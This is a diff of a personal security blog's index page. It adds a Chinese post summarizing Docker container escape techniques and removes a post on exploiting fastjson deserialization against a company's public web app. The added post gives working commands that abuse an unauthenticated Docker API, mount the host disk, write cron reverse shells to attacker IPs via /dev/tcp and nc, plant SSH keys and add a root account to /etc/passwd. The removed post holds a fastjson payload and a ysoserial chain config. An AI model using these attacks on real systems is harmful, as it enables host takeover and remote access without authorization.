@@ -152,6 +152,125 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Docker容器逃逸方式总结" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/06/14/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" class="article-date">
+  	<time datetime="2022-06-14T11:03:28.000Z" itemprop="datePublished">2022-06-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/06/14/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">
+        Docker容器逃逸方式总结
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Docker-Daemon-Api未授权访问"><a href="#Docker-Daemon-Api未授权访问" class="headerlink" title="Docker Daemon Api未授权访问"></a>Docker Daemon Api未授权访问</h2><p>本地环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.查看docker状态</span><br><span class="line">systemctl status docker</span><br><span class="line">2、打开docker服务文件</span><br><span class="line">sudo gedit /lib/systemd/system/docker.service</span><br><span class="line">修改ExecStart为：</span><br><span class="line">ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock</span><br><span class="line">3、重新加载docker配置</span><br><span class="line">systemctl daemon-reload // 1，加载docker守护线程</span><br><span class="line">systemctl restart docker // 2，重启docker</span><br><span class="line">看清楚位置路径是/bin还是/sbin，kali上面是 /sbin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/14/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220614190551866.png" alt="image-20220614190551866"></p>
+<p>快速环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line"></span><br><span class="line">cd ~/靶场环境/vulhub-master/docker/unauthorized-rce&amp;&amp;docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.32.128:2375/version">http://192.168.32.128:2375/version</a></p>
+<p><img src="/2022/06/14/Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20220614191300025.png" alt="image-20220614191300025"></p>
+<p>查看当前运行容器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://192.168.32.128:2375 ps</span><br><span class="line">CONTAINER ID   IMAGE                          COMMAND                  CREATED        STATUS                          PORTS                    NAMES</span><br><span class="line">f2f2db8a0476   c0ny1/vulnerable-node:latest   &quot;/app/start.sh&quot;          8 months ago   Up 3 hours                      0.0.0.0:3000-&gt;3000/tcp   vulstudy-master_vulnerable_node_1</span><br><span class="line">19c97b3eb5d4   vulstudy-master_postgres_db    &quot;docker-entrypoint.s…&quot;   8 months ago   Restarting (1) 18 seconds ago                            vulstudy-master_postgres_db_1</span><br></pre></td></tr></table></figure>
+
+<p>进入容器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://192.168.32.128:2375 exec -it f2f /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="方式一："><a href="#方式一：" class="headerlink" title="方式一："></a>方式一：</h3><p>创建特权容器：</p>
+<p>docker -H tcp://192.168.32.128:2375 run -it –privileged ubuntu:latest /bin/bash</p>
+<p>使用<strong>fdisk -l</strong>命令查看磁盘文件，找到主分区/dev/sda1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ # fdisk -l</span><br><span class="line">Disk /dev/sda: 80 GB, 85899345920 bytes, 167772160 sectors</span><br><span class="line">328965 cylinders, 255 heads, 2 sectors/track</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line"></span><br><span class="line">Device  Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type</span><br><span class="line">/dev/sda1 *  4,4,1       1023,254,2        2048  165771263  165769216 79.0G 83 Linux</span><br><span class="line">/dev/sda2    1023,254,2  1023,254,2   165773310  167770111    1996802  975M  5 Extended</span><br><span class="line">/dev/sda5    1023,254,2  1023,254,2   165773312  167770111    1996800  975M 82 Linux swap</span><br></pre></td></tr></table></figure>
+
+<p>创建test目录挂在宿主机磁盘：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">新建一个目录：mkdir /test</span><br><span class="line">挂载磁盘到新建目录：mount /dev/sda1 /test</span><br><span class="line">切换根目录：chroot /test</span><br><span class="line">这一步很重要，不然会找不到test目录 ：exit</span><br><span class="line">看下是否获得了宿主机目录</span><br></pre></td></tr></table></figure>
+
+<p>写计划任务反弹shell,条件是宿主机到vps的网一定要通</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写计划任务，反弹宿主机Shell。</span><br><span class="line">echo &#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.211.128.248/1234 0&gt;&amp;1&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<p>挂载ssh，需要挂载宿主机的root目录到容器，需要知道宿主机ip因为要连ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://192.168.32.128:2375 run -it -v /root:/root ubuntu:18.04 /bin/bash</span><br><span class="line">mkdir /root/.ssh</span><br><span class="line">cat id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys或者echo &quot;xxxx&quot;&gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line">然后ssh 私钥登录。</span><br><span class="line">ssh -i /tmp/id_rsa root@xxxxx</span><br></pre></td></tr></table></figure>
+
+<h3 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h3><p>执行脚本，不过不知道为啥本地测试没成功，nc监听反弹</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://ip:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, <span class="string">r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;</span>, remove=<span class="literal">True</span>, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="方式三："><a href="#方式三：" class="headerlink" title="方式三："></a>方式三：</h3><p>docker -H tcp://192.168.32.128:2375 images</p>
+<p>随便选一个镜像，挂载根目录，创建一个kkkkkk的用户密码123456，需要知道宿主机ip用来连接ssh</p>
+<p>docker -H tcp://192.168.32.128:2375 run -it -v /:/mnt 5deca9241f39 /bin/sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># openssl passwd -1 -salt kkkkkk 123456</span><br><span class="line">$1$kkkkkk$R913yPbJRwfO11aq9M3PM/</span><br><span class="line"># sed -i &#x27;$a kkkkkk:$1$kkkkkk$R913yPbJRwfO11aq9M3PM/:0:0:root:/root:/bin/sh&#x27; /mnt/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>ssh <a href="mailto:&#107;&#x6b;&#107;&#107;&#x6b;&#107;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#x32;&#x2e;&#49;&#x32;&#56;">&#107;&#x6b;&#107;&#107;&#x6b;&#107;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#x32;&#x2e;&#49;&#x32;&#56;</a></p>
+<p>如果存在shell的情况下，su kkkkkk，如果没有就ssh连接试试</p>
+<h2 id="特权容器"><a href="#特权容器" class="headerlink" title="特权容器"></a>特权容器</h2><p>攻击方式和上面一样，如果获取到一个shell是容器内的，查看容器是否有特权</p>
+<p>cat /proc/self/status | grep CapEff</p>
+<p>如果存在多个f就是特权模式，比如0000003fffffffff，000001ffffffffff，就可以挂在宿主机目录进行逃逸</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cat /proc/self/status | grep CapEff</span><br><span class="line">CapEff:	000001ffffffffff</span><br></pre></td></tr></table></figure>
+
+<h2 id="挂载docker-sock"><a href="#挂载docker-sock" class="headerlink" title="挂载docker.sock"></a><strong>挂载docker.sock</strong></h2><p>docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04</p>
+<p>在docker容器中安装docker</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># ubuntu 18.04安装dockersudo apt-get update</span><br><span class="line"># 安装依赖包sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br><span class="line"># 添加 Docker 的官方 GPG 密钥curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line"># 验证您现在是否拥有带有指纹的密钥sudo apt-key fingerprint 0EBFCD88# 设置稳定版仓库sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</span><br><span class="line"># 更新$ sudo apt-get update</span><br><span class="line"># 安装最新的Docker-ce sudo apt-get install docker-ce</span><br><span class="line"># 启动sudo systemctl enable dockersudo systemctl start docker</span><br></pre></td></tr></table></figure>
+
+<p>将宿主机的根目录挂载到容器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /:/test ubuntu:18.04 /bin/bash</span><br><span class="line">chroot test</span><br><span class="line">cd root/</span><br></pre></td></tr></table></figure>
+
+<p>写计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e  </span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.139/123 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>
+
+<h2 id="Docker容器挂载了宿主机根目录"><a href="#Docker容器挂载了宿主机根目录" class="headerlink" title="Docker容器挂载了宿主机根目录"></a>Docker容器挂载了宿主机根目录</h2><p>通过某种方式进入一个容器，看到某个目录可能是宿主机的根目录，比如</p>
+<p>docker run -it -v /:/test/ ubuntu:18.04</p>
+<p>在容器内，写计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chroot test</span><br><span class="line">cd root/</span><br><span class="line">crontab -e</span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.139/123 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>
+
+<h2 id="Cgroup执行宿主机系统命令"><a href="#Cgroup执行宿主机系统命令" class="headerlink" title="Cgroup执行宿主机系统命令"></a>Cgroup执行宿主机系统命令</h2><p>….    </p>
+<h2 id="Runc容器逃逸CVE-2019-5736"><a href="#Runc容器逃逸CVE-2019-5736" class="headerlink" title="Runc容器逃逸CVE-2019-5736"></a>Runc容器逃逸CVE-2019-5736</h2><p>docker version &lt;=18.09.2 RunC version &lt;=1.0-rc6         </p>
+<p>….            </p>
+<h2 id="Apparmor限制"><a href="#Apparmor限制" class="headerlink" title="Apparmor限制"></a>Apparmor限制</h2><p>….    </p>
+<h2 id="Runc-竞争CVE-2021-30465"><a href="#Runc-竞争CVE-2021-30465" class="headerlink" title="Runc 竞争CVE-2021-30465"></a>Runc 竞争CVE-2021-30465</h2><p>目前受影响的runc版本：runc &lt;= 1.0.0-rc94</p>
+<p>….    </p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-vCenterLDAP-Manage-Fix" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -923,85 +1042,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GO/" rel="tag">GO</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" rel="tag">安全开发</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-fastjson-jdbc-fuzz" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2022/01/25/fastjson-jdbc-fuzz/" class="article-date">
-  	<time datetime="2022-01-25T05:55:09.264Z" itemprop="datePublished">2022-01-25</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/25/fastjson-jdbc-fuzz/">
-        fastjson-jdbc-fuzz
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>最近对企业公网开放的web测试的时候，发现一处fastjson反序列化漏洞，需要结合mysql反序列化来利用，于是做了下记录。</p>
-<h3 id="1-判断业务存在fastjson"><a href="#1-判断业务存在fastjson" class="headerlink" title="1.判断业务存在fastjson"></a>1.判断业务存在fastjson</h3><p>利用hostToConnectTo参数修改成dns，并且把portToConnectTo修改成80，在dnslog中可以收到请求。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http://**/h*wk/**</span><br><span class="line">数据包如下：</span><br><span class="line">POST /** HTTP/1.1</span><br><span class="line">Host: **</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded;charset=UTF-8;</span><br><span class="line">Content-Length: 362</span><br><span class="line">Origin: http://**</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://**</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,<span class="string">&quot;hostToConnectTo&quot;</span>:<span class="string">&quot;hahaha&quot;</span>,<span class="string">&quot;portToConnectTo&quot;</span>:80,<span class="string">&quot;info&quot;</span>:&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;ubuntu&quot;</span>,<span class="string">&quot;useSSL&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;statementInterceptors&quot;</span>:<span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="string">&quot;autoDeserialize&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;,<span class="string">&quot;databaseToConnectTo&quot;</span>:<span class="string">&quot;mysql&quot;</span>,<span class="string">&quot;url&quot;</span>:<span class="string">&quot;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-利用fakemysql伪造一个mysql客户端"><a href="#2-利用fakemysql伪造一个mysql客户端" class="headerlink" title="2.利用fakemysql伪造一个mysql客户端"></a>2.利用fakemysql伪造一个mysql客户端</h3><p>原理是当程序触发fastjson漏洞去请求远程的mysql服务时，过低的myslq组件会触发mysql的客户端反序列化漏洞，工具是fnmsd大佬写的<a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server%E3%80%82">https://github.com/fnmsd/MySQL_Fake_Server。</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接开启python3 server.py就可以了</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/25/fastjson-jdbc-fuzz/image-20220401163656870.png" alt="image-20220401163656870"></p>
-<p><img src="/2022/01/25/fastjson-jdbc-fuzz/image-20220401163727108.png" alt="image-20220401163727108"></p>
-<h3 id="3-修改config文件来fuzz反序列化链条"><a href="#3-修改config文件来fuzz反序列化链条" class="headerlink" title="3.修改config文件来fuzz反序列化链条"></a>3.修改config文件来fuzz反序列化链条</h3><p>使用curl探测能出网的链条，这样就知道哪条链可以用来打了</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;config&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;ysoserialPath&quot;</span>:<span class="string">&quot;ysoserial-0.0.8-SNAPSHOT-all.jar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;javaBinPath&quot;</span>:<span class="string">&quot;java&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fileOutputDir&quot;</span>:<span class="string">&quot;./fileOutput/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;displayFileContentOnScreen&quot;</span>:<span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;saveToFile&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;fileread&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;win_ini&quot;</span>:<span class="string">&quot;c:\\windows\\win.ini&quot;</span>,</span><br><span class="line">        <span class="string">&quot;win_hosts&quot;</span>:<span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;win&quot;</span>:<span class="string">&quot;c:\\windows\\&quot;</span>,</span><br><span class="line">        <span class="string">&quot;linux_passwd&quot;</span>:<span class="string">&quot;/etc/passwd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;linux_hosts&quot;</span>:<span class="string">&quot;/etc/hosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;index_php&quot;</span>:<span class="string">&quot;index.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ssrf&quot;</span>:<span class="string">&quot;https://www.baidu.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__defaultFiles&quot;</span>:[<span class="string">&quot;/etc/hosts&quot;</span>,<span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;yso&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;Jdk7u21&quot;</span>:[<span class="string">&quot;Jdk7u21&quot;</span>,<span class="string">&quot;curl http://Jdk7u21.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections1&quot;</span>:[<span class="string">&quot;CommonsCollections1&quot;</span>,<span class="string">&quot;curl http://CommonsCollections1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections2&quot;</span>:[<span class="string">&quot;CommonsCollections2&quot;</span>,<span class="string">&quot;curl http://CommonsCollections2.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections3&quot;</span>:[<span class="string">&quot;CommonsCollections3&quot;</span>,<span class="string">&quot;curl http://CommonsCollections3.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections4&quot;</span>:[<span class="string">&quot;CommonsCollections4&quot;</span>,<span class="string">&quot;curl http://CommonsCollections4.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections5&quot;</span>:[<span class="string">&quot;CommonsCollections5&quot;</span>,<span class="string">&quot;curl http://CommonsCollections5.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections6&quot;</span>:[<span class="string">&quot;CommonsCollections6&quot;</span>,<span class="string">&quot;curl http://CommonsCollections6.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections7&quot;</span>:[<span class="string">&quot;CommonsCollections7&quot;</span>,<span class="string">&quot;curl http://CommonsCollections7.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;URLDNS&quot;</span>:[<span class="string">&quot;URLDNS&quot;</span>,<span class="string">&quot;http://URLDNS.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollectionsK1TomcatEcho&quot;</span>:[<span class="string">&quot;CommonsCollectionsK1TomcatEcho&quot;</span>,<span class="string">&quot;whoami&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollectionsK2TomcatEcho&quot;</span>:[<span class="string">&quot;CommonsCollectionsK2TomcatEcho&quot;</span>,<span class="string">&quot;whoami&quot;</span>],</span><br><span class="line">        <span class="string">&quot;BeanShell1&quot;</span>:[<span class="string">&quot;BeanShell1&quot;</span>,<span class="string">&quot;curl http://BeanShell1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;C3P0&quot;</span>:[<span class="string">&quot;C3P0&quot;</span>,<span class="string">&quot;curl http://C3P0.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsBeanutils1&quot;</span>:[<span class="string">&quot;CommonsBeanutils1&quot;</span>,<span class="string">&quot;curl http://CommonsBeanutils1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollectionsK1&quot;</span>:[<span class="string">&quot;CommonsCollectionsK1&quot;</span>,<span class="string">&quot;curl http://CommonsCollectionsK1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollectionsK2&quot;</span>:[<span class="string">&quot;CommonsCollectionsK2&quot;</span>,<span class="string">&quot;curl http://CommonsCollectionsK2.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollectionsK3&quot;</span>:[<span class="string">&quot;CommonsCollectionsK3&quot;</span>,<span class="string">&quot;curl http://CommonsCollectionsK3.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollectionsK4&quot;</span>:[<span class="string">&quot;CommonsCollectionsK4&quot;</span>,<span class="string">&quot;curl http://CommonsCollectionsK4.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;FileUpload1&quot;</span>:[<span class="string">&quot;FileUpload1&quot;</span>,<span class="string">&quot;curl http://FileUpload1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;Jdk8u20&quot;</span>:[<span class="string">&quot;Jdk8u20&quot;</span>,<span class="string">&quot;curl http://Jdk8u20.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;Spring1&quot;</span>:[<span class="string">&quot;Spring1&quot;</span>,<span class="string">&quot;curl http://Spring1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;Spring2&quot;</span>:[<span class="string">&quot;Spring2&quot;</span>,<span class="string">&quot;curl http://Spring2.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;Vaadin1&quot;</span>:[<span class="string">&quot;Vaadin1&quot;</span>,<span class="string">&quot;curl http://Vaadin1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;Wicket1&quot;</span>:[<span class="string">&quot;Wicket1&quot;</span>,<span class="string">&quot;curl http://Wicket1.dnscheck.io&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>修改用户名为fuzz的链条名字，修改port为3306，服务器发送了请求，伪造的mysql收到请求</p>
-<img src="/2022/01/25/fastjson-jdbc-fuzz/image-20220401164502384.png" alt="image-20220401164502384" style="zoom:50%;">
-
-<h3 id="4-精准打击"><a href="#4-精准打击" class="headerlink" title="4.精准打击"></a>4.精准打击</h3><p>判断哪条链可以出来之后，就可以精准打击，修改配置文件，重新启动mysql服务，发送数据包</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;config&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;ysoserialPath&quot;</span>:<span class="string">&quot;ysoserial-0.0.8-SNAPSHOT-all.jar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;javaBinPath&quot;</span>:<span class="string">&quot;java&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fileOutputDir&quot;</span>:<span class="string">&quot;./fileOutput/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;displayFileContentOnScreen&quot;</span>:<span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;saveToFile&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;fileread&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;win_ini&quot;</span>:<span class="string">&quot;c:\\windows\\win.ini&quot;</span>,</span><br><span class="line">        <span class="string">&quot;win_hosts&quot;</span>:<span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;win&quot;</span>:<span class="string">&quot;c:\\windows\\&quot;</span>,</span><br><span class="line">        <span class="string">&quot;linux_passwd&quot;</span>:<span class="string">&quot;/etc/passwd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;linux_hosts&quot;</span>:<span class="string">&quot;/etc/hosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;index_php&quot;</span>:<span 